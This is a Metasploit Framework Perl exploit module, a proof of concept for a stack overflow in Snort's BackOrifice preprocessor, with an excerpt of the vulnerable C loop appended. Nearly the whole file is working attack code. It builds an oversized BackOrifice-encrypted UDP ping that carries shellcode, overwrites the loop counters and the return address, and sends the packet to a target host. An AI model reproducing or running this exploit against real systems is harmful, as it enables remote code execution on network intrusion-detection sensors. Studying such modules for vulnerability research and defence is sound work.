##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::snort_bo_ping;
use base 'Msf::Exploit';
use strict;
use Pex::Text;

my $advanced = { };
my $info =
  {
        'Name'    => 'Snort BackOrifice PING Buffer Overflow (PoC)',
        'Version' => '$Revision: 1.33 $',
        'Authors' =>
          [
                'H D Moore <hdm [at] metasploit.com>'
          ],

        'Description'  => Pex::Text::Freeform(qq{
        This module exploits a stack overflow in the Snort BackOrifice preprocessor.
        This is just a PoC right now...
}),

        'Arch'  => [ 'x86' ],
        'OS'    => [ 'linux' ],
        'Priv'  => 1,

        'UserOpts'  =>
          {
                'RHOST' => [1, 'ADDR', 'The target address'],
                'RPORT' => [1, 'PORT', 'The target port', 53],
          },

        'Payload' =>
          {
                'Space'     => 1024,
                'BadChars'  => "\x00",
                'MinNops'   => 512,
                'Keys'      => ['+ws2ord'],
          },

        'Refs'  =>
          [

          ],

        'DefaultTarget' => 0,
        'Targets' =>
          [
                ['Test Target', 0x41424344],
          ],

        'Keys' => ['snort'],


        'DisclosureDate' => 'Oct 18 2005',

  };


sub new {
        my $class = shift;
        my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
        return($self);
}

sub BORand {
        my $self = shift;
        return ($self->{'BOSeed'} = (($self->{'BOSeed'} * 214013) + 2531011) % (2**32));
}

sub BOCrypt {
        my $self = shift;
        my $data = shift;
        my $res;

        foreach my $c (unpack("C*", $data)) {
                $res .= chr($c ^ ($self->BORand() >> 16 & 0xFF) );
        }
        return $res;
}

sub Exploit {
        my $self = shift;
        my $target_host  = $self->GetVar('RHOST');
        my $target_port  = $self->GetVar('RPORT');
        my $target       = $self->Targets->[ $self->GetVar('TARGET') ];
        my $shellcode    = $self->GetVar('EncodedPayload')->Payload;

        # MAGIC         8
        # LEN   4
        # ID    4
        # T     1
        # DATA  variable
        # CRC   1

        # This length values results in a negative value for "len"
        my $pwn  = "X" x 32764;

        # The shellcode is half nops, just for testing right now
        substr($pwn, 0, length($shellcode), $shellcode);

        substr($pwn, 1040, 4, "\x01\x01\x01\x01");  # Patch "i" in a magic way
        substr($pwn, 1052, 4, "\x02\x02\x01\x01");  # Path "len" so its slightly more than "i"
        substr($pwn, 1068, 4, pack('V', $target->[1]));

        # Terminate the overwrite only after we smashed the return address
        substr($pwn, 1072, 1, "\x00");

        # Set the ping type
        my $type = pack('C', 0x40 + 0x01); # Ping
        my $data = $pwn . "PONG";
        my $pong =
                "*!*QWTY?".     # Magic
                pack('V', length($data)).
                pack('N', rand(0xffffffff)).
                $type.
                $data.
                "X";

        $self->{'BOSeed'} = 0x7a69; # Randomize this :-)

        $pong = $self->BOCrypt($pong);

        my $sock = Msf::Socket::Udp->new
          (
                'PeerAddr'  => $target_host,
                'PeerPort'  => $target_port,
          );

        if ($sock->IsError) {
                $self->PrintLine('[*] Error creating socket: ' . $sock->GetError);
                return;
        }

        $sock->Send($pong);
        $sock->Recv(-1, 2);
}

__DATA__

spp_bo.c - v2.4.2
----------------------------------------------------------------
    while ( i < len )
    {
        plaintext = (char) (*pkt_data ^ (BoRand()%256));
        *buf_ptr = plaintext;

                if ( buf_ptr > (buf1 + sizeof(buf1)) ) {
                        printf("SMASH: %d/%d [%.2x > %.2x] @ 0x%.8x\n",
                                        i, len,
                                        (unsigned char) *pkt_data,
                                        (unsigned char) *buf_ptr,
                                        buf_ptr);
                }

                i++;
        pkt_data++;
        buf_ptr++;

        if ( plaintext == 0 ) {
                        printf("*** reset buf_ptr to 0x%.8x\n", buf2);
                        buf_ptr = buf2;
                }
    }

